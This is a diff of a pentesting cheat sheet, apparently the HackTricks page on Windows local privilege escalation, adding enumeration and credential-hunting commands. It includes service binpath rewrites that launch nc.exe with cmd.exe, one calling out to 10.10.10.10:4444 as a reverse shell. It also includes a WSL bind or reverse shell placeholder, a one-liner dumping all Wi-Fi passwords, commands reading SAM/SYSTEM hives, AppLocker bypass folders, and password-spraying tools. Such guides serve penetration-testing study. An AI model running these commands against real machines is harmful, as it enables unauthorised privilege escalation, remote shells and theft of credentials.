@@ -4,7 +4,9 @@
 
 If you want to **know** about my **latest modifications**/**additions**, **join the** [**PEASS & HackTricks telegram group here**](https://t.me/peass)**.**
 
-## Windows version exploits
+## Windows version
+
+### Version info enumeration
 
 Check if the Windows version has any known vulnerability \(check also the patches applied\).
 
@@ -12,6 +14,7 @@ Check if the Windows version has any known vulnerability \(check also the patche
 systeminfo
 systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
 wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
+wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
 ```
 
 ```bash
@@ -20,31 +23,54 @@ Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hot
 Get-Hotfix -description "Security update" #List only "Security Update" patches
 ```
 
-_post/windows/gather/enum\_patches  
-post/multi/recon/local\_exploit\_suggester_  
-[_watson_](https://github.com/rasta-mouse/Watson)  
-__[_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _\(Winpeas has watson embedded\)_
+### Version Exploits
 
-[Windows known vulnerabilities PoCs.](https://github.com/nomi-sec/PoC-in-GitHub)
+#### On the system
+
+* _post/windows/gather/enum\_patches_
+* _post/multi/recon/local\_exploit\_suggester_
+* [_watson_](https://github.com/rasta-mouse/Watson)
+* [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _\(Winpeas has watson embedded\)_
+
+**Locally with system infromation**
+
+* [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
+* [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)
+
+**Github repos of exploits:**
+
+* \*\*\*\*[https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
+* [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
 
 ### Vulnerable Drivers
 
-Look for possible third party weird/vulnerable drivers
+Look for possible **third party weird/vulnerable** drivers
 
 ```text
 driverquery
 ```
 
-## Enumeration
-
 ### Environment
 
 Any credential/Juicy info saved in the env variables?
 
-```text
+```bash
 set
 dir env:
+Get-ChildItem Env: | ft Key,Value
 ```
+
+### Powershell history
+
+```bash
+type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+cat (Get-PSReadlineOption).HistorySavePath
+cat (Get-PSReadlineOption).HistorySavePath | sls passw
+```
+
+## Antivirus and Detectors
 
 ### LAPS
 
@@ -77,7 +103,28 @@ reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\Subs
 Check is there is any anti virus running:
 
 ```bash
-WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List | more 
+WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List | more
+Get-MpComputerStatus 
+```
+
+### AppLocker Policy
+
+Check which files/extensions are blacklisted/whitelisted.
+
+```text
+Get-ApplockerPolicy -Effective -xml
+Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
+$a = Get-ApplockerPolicy -effective
+$a.rulecollections
+```
+
+#### Useful Writable folders to bypass AppLocker Policy
+
+```text
+C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
+C:\Windows\System32\spool\drivers\color
+C:\Windows\Tasks
+C:\windows\tracing
 ```
 
 ## Users & Groups
@@ -94,6 +141,15 @@ whoami /all #Check the privileges
 
 # PS
 Get-WmiObject -Class Win32_UserAccount
+Get-LocalUser | ft Name,Enabled,LastLogon
+Get-ChildItem C:\Users -Force | select Name
+Get-LocalGroupMember Administrators | ft Name, PrincipalSource
+```
+
+### Password Policy
+
+```text
+net accounts
 ```
 
 ### Get the content of the clipboard
@@ -164,12 +220,42 @@ There are a lot of various **memory injection** strategies that can be used with
 whoami /priv
 ```
 
+## Drives
+
+```bash
+wmic logicaldisk get caption || fsutil fsinfo drives
+wmic logicaldisk get caption,description,providername
+Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
+```
+
 ## Network
 
 Check for **restricted services** from the outside
 
 ```bash
 netstat -ano #Opened ports?
+```
+
+List all network interfaces, IP, and DNS.
+
+```text
+ipconfig /all
+Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
+Get-DnsClientServerAddress -AddressFamily IPv4 | ft
+```
+
+List current routing table
+
+```text
+route print
+Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
+```
+
+List the ARP table
+
+```text
+arp -A
+Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
 ```
 
 More[ commands for network enumeration here](../basic-cmd-for-pentesters.md#network)
@@ -200,6 +286,7 @@ Check if you can overwrite some binary running or if you can dump the memory of 
 
 ```bash
 Tasklist /SVC #List processes running and services
+tasklist /v /fi "username eq system" #Filter "system" processes
 
 #With allowed Usernames
 Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize
@@ -244,6 +331,7 @@ Get a list of services:
 net start
 wmic service list brief
 sc query
+Get-Service
 ```
 
 ### Permissions
@@ -294,6 +382,7 @@ If the group "Authenticated users" has **SERVICE\_ALL\_ACCESS** in a service, th
 ```bash
 sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
 sc config <Service_Name> binpath= "net localgroup administrators username /add"
+sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"
 
 sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
 ```
@@ -387,8 +476,6 @@ gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Whe
 ```
 
 **You can detect and exploit** this vulnerability with metasploit: _exploit/windows/local/trusted\_service\_path_  
-
-
 You can manually create a service binary with metasploit:
 
 ```bash
@@ -400,6 +487,35 @@ msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f ex
 Programs usually can't function by themselves, they have a lot of resources they need to hook into \(mostly DLL's but also proprietary files\). If a **program or service loads a file from a directory we have write access to**, we can abuse that to **pop a shell with the privileges the program runs with**.
 
 **In order to learn more about how to** [**discover and exploit Dll Hijacking vulnerabilities read this**](dll-hijacking.md)**.**
+
+## Installed Applications
+
+```text
+Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
+Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
+```
+
+## Windows Subsystem for Linux \(wsl\)
+
+```text
+C:\Windows\System32\bash.exe
+C:\Windows\System32\wsl.exe
+```
+
+ Binary `bash.exe` can also be found in `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`
+
+If you get root user you can listen on any port \(the first time you use `nc.exe` to listen on a port it will ask via GUI if `nc` should be allowed by the firewall\).
+
+```text
+wsl whoami
+./ubuntun1604.exe config --default-user root
+wsl whoami
+wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
+```
+
+To easily start bash as root, you can try `--default-user root`
+
+ You can explore the `WSL` filesystem in the folder `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`
 
 ## Credentials
 
@@ -457,6 +573,8 @@ You can **extract many DPAPI** **masterkeys** from **memory** with the `sekurlsa
 netsh wlan show profile
 #To get the clear-text password use
 netsh wlan show profile <SSID> key=clear
+#Oneliner to extract all wifi passwords
+cls & echo. & for /f "tokens=4 delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name=%a key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on
 ```
 
 ### AppCmd.exe
@@ -561,7 +679,7 @@ More information about this technique here: [https://blog.ropnop.com/extracting-
 Check if `C:\Windows\CCM\SCClient.exe` exists .  
 Installers are **run with SYSTEM privileges**, many are vulnerable to **DLL Sideloading \(Info from** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**\).**
 
-```text
+```bash
 $result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
 if ($result) { $result }
 else { Write "Not Installed." }
@@ -601,17 +719,42 @@ C:\Windows\System32\Sysprep\unattend.xml
 C:\Windows\System32\Sysprep\unattended.xml
 C:\unattend.txt
 C:\unattend.inf
+dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
+```
+
+You can also search for these files using metasploit: _post/windows/gather/enum\_unattend_
+
+Example content_:_
+
+```markup
+<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
+    <AutoLogon>
+     <Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
+     <Enabled>true</Enabled>
+     <Username>Administrateur</Username>
+    </AutoLogon>
+
+    <UserAccounts>
+     <LocalAccounts>
+      <LocalAccount wcm:action="add">
+       <Password>*SENSITIVE*DATA*DELETED*</Password>
+       <Group>administrators;users</Group>
+       <Name>Administrateur</Name>
+      </LocalAccount>
+     </LocalAccounts>
+    </UserAccounts>
 ```
 
 #### SAM & SYSTEM backups
 
-```text
-C:\Windows\repair\SAM
-C:\Windows\System32\config\RegBack\SAM
-C:\Windows\System32\config\SAM
-C:\Windows\repair\SYSTEM
-C:\Windows\System32\config\SYSTEM
-C:\Windows\System32\config\RegBack\SYSTEM
+```bash
+# Usually %SYSTEMROOT% = C:\Windows
+%SYSTEMROOT%\repair\SAM
+%SYSTEMROOT%\System32\config\RegBack\SAM
+%SYSTEMROOT%\System32\config\SAM
+%SYSTEMROOT%\repair\system
+%SYSTEMROOT%\System32\config\SYSTEM
+%SYSTEMROOT%\System32\config\RegBack\system
 ```
 
 #### McAffe SiteList.xml
@@ -650,11 +793,39 @@ AppData\Roaming\gcloud\access_tokens.db
 .azure\azureProfile.json
 ```
 
+#### IIS Web Config
+
+```bash
+Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
+```
+
+```bash
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
+C:\inetpub\wwwroot\web.config
+```
+
+```text
+Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
+Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
+```
+
+Example of web.config with credentials:
+
+```markup
+<authentication mode="Forms"> 
+    <forms name="login" loginUrl="/admin">
+        <credentials passwordFormat = "Clear">
+            <user name="Administrator" password="SuperAdminPassword" />
+        </credentials>
+    </forms>
+</authentication>
+```
+
 ### More possible files with credentials
 
 Known files that some time ago contained **passwords** in **clear-text** or **Base64**
 
-```text
+```bash
 $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
 vnc.ini, ultravnc.ini, *vnc*
 web.config
@@ -701,19 +872,24 @@ Bookmarks       #Chrome
 History         #Chrome
 TypedURLsTime   #IE
 TypedURLs       #IE
-appcmd.exe
-```
-
-Example of web.config with credentials:
-
-```markup
-<authentication mode="Forms"> 
-    <forms name="login" loginUrl="/admin">
-        <credentials passwordFormat = "Clear">
-            <user name="Administrator" password="SuperAdminPassword" />
-        </credentials>
-    </forms>
-</authentication>
+%SYSTEMDRIVE%\pagefile.sys
+%WINDIR%\debug\NetSetup.log
+%WINDIR%\repair\sam
+%WINDIR%\repair\system
+%WINDIR%\repair\software, %WINDIR%\repair\security
+%WINDIR%\iis6.log
+%WINDIR%\system32\config\AppEvent.Evt
+%WINDIR%\system32\config\SecEvent.Evt
+%WINDIR%\system32\config\default.sav
+%WINDIR%\system32\config\security.sav
+%WINDIR%\system32\config\software.sav
+%WINDIR%\system32\config\system.sav
+%WINDIR%\system32\CCM\logs\*.log
+%USERPROFILE%\ntuser.dat
+%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
+%WINDIR%\System32\drivers\etc\hosts
+dir c:*vnc.ini /s /b
+dir c:*ultravnc.ini /s /b
 ```
 
 Search all of the proposed files:
@@ -725,13 +901,6 @@ dir /s/b /A:-D RDCMan.settings == *.rdg == SCClient.exe == *_history == .sudo_as
 
 ```text
 Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
-```
-
-If the server is a IIS server, check the contents of the folder
-
-```text
-Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
-Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
 ```
 
 Check Logs \(IIS, Apache\)
@@ -755,8 +924,7 @@ findstr /D:C:\ /si password *.xml *.ini *.txt #A lot of output can be generated
 findstr /D:C:\ /M /SI password *.xml *.ini *.txt 2>nul | findstr /V /I "\\AppData\\Local \\WinXsX ApnDatabase.xml \\UEV\\InboxTemplates \\Microsoft.Windows.CloudExperienceHost" 2>nul #filtered output
 ```
 
-_**post/windows/gather/credentials/\*  
-post/windows/gather/enum\_unattend**_
+_**post/windows/gather/credentials/\***_
 
 #### Home credentials files
 
@@ -793,10 +961,15 @@ reg query HKCU /f password /t REG_SZ /s #Look for registries that contains "pass
 
 [Extract openssh keys from registry.](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)
 
+### Tools that search for passwords
+
 The tool [SessionGopher](https://github.com/Arvanaghi/SessionGopher) search for **sessions**, **usernames** and **passwords** of several tools that save this data in clear text \(PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP\)
 
-```text
+```bash
+Import-Module path\to\SessionGopher.ps1;
 Invoke-SessionGopher -Thorough
+Invoke-SessionGopher -AllDomain -o
+Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
 ```
 
 ### Browsers History
@@ -808,6 +981,33 @@ Tools to extract passwords from browsers:
 
 * Mimikatz: `dpapi::chrome`
 * [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)\*\*\*\*
+
+### **Generic Password search in files and registry**
+
+#### Search for file contents
+
+```bash
+cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
+findstr /si password *.xml *.ini *.txt *.config
+findstr /spin "password" *.*
+```
+
+#### Search for a file with a certain filename
+
+```bash
+dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
+where /R C:\ user.txt
+where /R C:\ *.ini
+```
+
+#### Search the registry for key names and passwords
+
+```bash
+REG QUERY HKLM /F "password" /t REG_SZ /S /K
+REG QUERY HKCU /F "password" /t REG_SZ /S /K
+REG QUERY HKLM /F "password" /t REG_SZ /S /d
+REG QUERY HKCU /F "password" /t REG_SZ /S /d
+```
 
 ## AlwaysInstallElevated
 
@@ -978,6 +1178,7 @@ If you manages to **hijack a dll** being **loaded** by a **process** running as 
 [**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) ****-- Extracts crendentials from Credential Manager. Detected.  
 [**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) ****-- Spray gathered passwords across domain  
 [**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) ****-- Inveigh is a PowerShell ADIDNS/LLMNR/mDNS/NBNS spoofer and man-in-the-middle tool.  
+[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) -- Basic privesc Windows enumeration  
 [~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock)  ~~****~~-- Search for known privesc vulnerabilities \(DEPRECATED for Watson\)  
 [~~**WINspect**~~](https://github.com/A-mIn3/WINspect) ~~****~~-- Local checks **\(Need Admin rights\)**
 
@@ -986,8 +1187,8 @@ If you manages to **hijack a dll** being **loaded** by a **process** running as 
 [**Watson**](https://github.com/rasta-mouse/Watson) ****-- Search for known privesc vulnerabilities \(needs to be compiled using VisualStudio\) \([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson)\)  
 [**SeatBelt**](https://github.com/GhostPack/Seatbelt) ****-- Enumerates the host searching for misconfigurations \(more a gather info tool than privesc\) \(needs to be compiled\) **\(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**\)**  
 [**LaZagne**](https://github.com/AlessandroZ/LaZagne) ****-- Extracts credentials from lots of softwares \(precompiled exe in github\)  
-[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) ~~****~~-- Check for misconfiguration \(executable precompiled in github\). Not recommended. It does not works well in Win10.  
-[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Check for possible misconfigurations \(exe from python\). Not recommended. It does not works well in Win10.
+[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) ~~****~~-- Check for misconfiguration \(executable precompiled in github\). Not recommended. It does not work well in Win10.  
+[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Check for possible misconfigurations \(exe from python\). Not recommended. It does not work well in Win10.
 
 #### Bat
 
